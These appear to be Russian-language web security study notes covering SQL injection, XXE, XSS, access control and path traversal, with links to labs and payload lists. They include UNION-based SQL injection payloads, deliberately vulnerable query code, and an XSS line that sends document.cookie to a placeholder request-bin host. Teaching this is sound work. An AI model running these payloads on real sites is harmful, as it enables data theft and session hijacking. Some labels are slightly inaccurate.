## Уязвимости инъекции команд ОС

К подобным уязвимостям относятся:  
- Уязвимости небезопасной десериализации
- Уязвимости внедрения шаблонов на стороне сервера SSTI
- Уязвимости SQL инъекции
- Уязвимости переполнения буфера / кучи / стека
- Множественные случаи проблем и ошибок реализации, возникающих при работе с запуском процессов и работе с терминальной оболочкой

## Уязвимости контроля доступа

В контексте веб-приложений контроль доступа зависит от аутентификации и управления сеансами:

- Аутентификация идентифицирует пользователя и подтверждает, что он является тем, за кого себя выдает.
- Управление сеансом идентифицирует, какие последующие HTTP-запросы выполняются тем же самым пользователем.
- Управление доступом определяет, разрешено ли пользователю выполнять действия, которые он пытается выполнить.

С точки зрения пользователя, контроль доступа можно разделить на следующие категории:

- Вертикальный контроль доступа (Insecure Function Level Access Control (IFLAC)).
- Горизонтальный контроль доступа (Небезопасные прямые ссылки на объекты (IDOR)).
- Контекстно-зависимый контроль доступа.

## Уязвимости разграничения доступа к каталогам

Тестовые векторы атаки: `https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal`  

## Уязвимости SQL-инъекции

Уязвимости SQL-инъекций могут приводить к:

- Извлечению данных и возможности исследования базы данных
- Модификации информации в базе данных (удалению, добавлению, изменению)
- Обходу логики
- Обходу механизмов авторизации и аутентификации
- Чтению файлов ОС
- Выполнению команд ОС
- Отказу в обслуживании

Техники: 
- Получение количества колонок таблицы  
`2 order by N`
- Узнать порядок вывода значений колонок из таблицы  
`-1 UNION SELECT 1,2,3,4,5,6,7,8 -- -`
- Получение метаданных из специфичной для MySQL таблицы `INFORMATION_SCHEMA`  
`-1 UNION SELECT 1,2,3,4,TABLE_NAME,6,7,8 FROM INFORMATION_SCHEMA.tables -- -`
- Получение списка всех таблиц с помощью функции `GROUP_CONCAT`  
`-1 UNION SELECT 1,2,3,4,GROUP_CONCAT(TABLE_NAME, '-'),6,7,8 FROM INFORMATION_SCHEMA.tables -- -`
- Получение списка колонок таблицы  
`-1 UNION SELECT 1,2,3,4,GROUP_CONCAT(COLUMN_NAME, '-'),6,7,8 FROM INFORMATION_SCHEMA.columns WHERE table_name='secret_table' -- -`
- Получение значения из другой таблицы   
`-1 UNION SELECT 1,2,3,4,secret_column,6,7,8 FROM secret_table -- -`

#### Примеры SQL инъекций

Сценарий №1

Приложение использует недоверенные данные при создании следующего уязвимого SQL-вызова:  

```php
String query = "SELECT * FROM accounts WHERE custID=""+request.getParameter("id") +"";
```

Сценарий №2

Безоговорочное доверие приложений к фреймворкам может привести к появлению уязвимых запросов (например, в языке запросов HQL):  
```php
Query HQLQuery = session.createQuery("FROM accounts WHERE custID="" +request.getParameter("id") + "");
```
В обоих случаях злоумышленник изменяет в своем браузере значение параметра "id" для отправки  ' or '1'='1.  

Например: 
```
http://example.com/app/accountView?id='+or+'1'='1
```

Сценарий №3

Использование фреймворков, кажущееся безопасным, может быть обманчивым.

Онлайн сервисы:  
- [onecompiler](https://onecompiler.com/postgresql)
- [mycompiler](https://www.mycompiler.io/new/mysql)

Существует широкий спектр уязвимостей, атак и методов SQL инъекции, которые возникают в различных ситуациях. К числу наиболее распространенных примеров SQL-инъекций относятся:  

- `Stacked queries` — инъекция SQL-запросов, позволяющая злоумышленнику выполнить несколько запросов за один раз.

- `Union-based` — инъекция, использующая оператор UNION для объединения результатов двух запросов, что позволяет злоумышленнику извлекать данные из других таблиц.

- `Error-based` — инъекция, основанная на ошибке, которая может возникнуть при выполнении запроса, что позволяет злоумышленнику получать информацию об уязвимости.

- `Boolean blind` — инъекция, при которой злоумышленник использует булевы выражения для проверки наличия или отсутствия определенных данных в базе данных.

- `Time-based` — инъекция, которая использует задержку выполнения запроса для получения информации о базе данных.

- `Out of band` — инъекция, которая не взаимодействует с сайтом напрямую, а использует другой канал для передачи данных, например, отправку электронной почты или HTTP-запросов.

Дополнительный материалы:
- [База знаний по возможностям в языке SQL разных СУБД](https://websec.ca/kb/sql_injection)
- [Wiki по инъекциям SQL](https://sqlwiki.netspi.com/)
- [PayloadsAllTheThings - SQL injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [PayloadsAllTheThings - NoSQL injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
- [OWASP NoSQL injection slides](https://owasp.org/www-pdf-archive/GOD16-NOSQL.pdf)
[PortSwigger - SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
[SQLMap - Инструмент автоматизации](https://xakep.ru/2011/12/06/57950/)

Практика:  
- [Навыки работы с SQL](https://www.sql-ex.ru/?Lang=0)
- [portswigger](https://portswigger.net/web-security/sql-injection)
- [root-me](https://www.root-me.org/ru/Zadachi-i-problemy/Veb-server/)

## Уязвимости внедрения внешних сущностей XML

Список полезных нагрузок:  
- [PayloadsAllTheThings/XXE Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md)

Атаки инъекции XXE позволяют провести множество различных вариаций векторов атак, например:  

- Использование XXE для получения файлов, где определяется внешняя сущность, содержащая содержимое файла, и возвращается в ответе приложения.
- Использование XXE для выполнения SSRF атак, где внешняя сущность определяется на основе URL на внутреннюю систему.
- Использование слепой инъекции XXE с отправкой данных за рамки клиент-серверного приложения, где конфиденциальные данные передаются с сервера приложения на систему, контролируемую злоумышленником.
- Использование слепого XXE для получения данных с помощью сообщений об ошибках, где злоумышленник может вызвать сообщение об ошибке разбора, содержащее конфиденциальные данные.
- Использование XXE для проведения атак отказа в обслуживании (англ. Distributed Denialof Service (DDoS)).

Дополнительный материалы:  
- [portswigger](https://portswigger.net/web-security/xxe/xml-entities)
- [PayloadsAllTheThings - XXE Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
- [Обзор уязвимости XXE и ее вариаций](https://phonexicum.github.io/infosec/xxe.html) 
- [Практика на платформе portswigger](https://portswigger.net/web-security/all-labs#xml-external-entity-xxe-injection)

## Атаки межсайтового скриптинга (XSS)

Межсайтовый скриптинг (также известный как Cross-Site Scripting, XSS) – это уязвимость веб-безопасности, позволяющая злоумышленнику компрометировать взаимодействие пользователей с уязвимым приложением. Она позволяет злоумышленнику обходить политику одного источника (Same Origin Policy, SOP), которая предназначена для разделения различных веб сайтов друг от друга.  

Пример:  
`<img src=x onerror=fetch('https://ADDR.x.pipedream.net/?'+document.cookie) />`  

Полезный ресурс:  
[Inspect webhooks and HTTP requests](https://pipedream.com/requestbin)  

Три основных типа XSS-атак:  

- Отраженный XSS, где вредоносный скрипт происходит из текущего HTTP запроса.
Отраженный межсайтовый скриптинг (XSS) возникает, когда приложение получает данные в HTTP-запросе и включает эти данные непосредственно в ответ небезопасным способом.  
Например: `https://insecure-website.com/status?message=<script>/*+Bad+stuff+here...+*/</script>.`
- Хранимый XSS, где вредоносный скрипт приходит из хранилища данных веб-сайта.
Сохраненный межсайтовый скриптинг (скриптинг второго порядка или постоянный XSS) возникает, когда приложение получает данные из недоверенного источника и включает эти данные в свои последующие HTTP-ответы небезопасным способом.
- Dom-based XSS, где уязвимость существует в клиентском коде, а не в коде сервера.
Наиболее распространенным источником для DOM XSS является URL, доступ к которому обычно осуществляется с помощью объекта windows.location.  Злоумышленник может построить ссылку для отправки жертвы на уязвимую страницу с полезной нагрузкой в строке запроса и фрагментами URL. В некоторых случаях, например, при нацеливании на страницу 404 или на сайт, работающий на PHP, полезная нагрузка также может быть помещена в путь.

Дополнительный материалы:
- [Простейший пример уязвимости](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded)
- [Практики portswigger](https://portswigger.net/web-security/all-labs#cross-site-scripting)
- [Механизмы обеспечения безопасности клиентской части](https://developer.mozilla.org/en-US/docs/Web/Security)
- Основополагающие механизмы в работе браузера: 
    - [SOP](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)
    - [CORS](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)
    - [понятие "источника"](https://developer.mozilla.org/en-US/docs/Glossary/Origin)
    - [URL](https://url.spec.whatwg.org/#origin)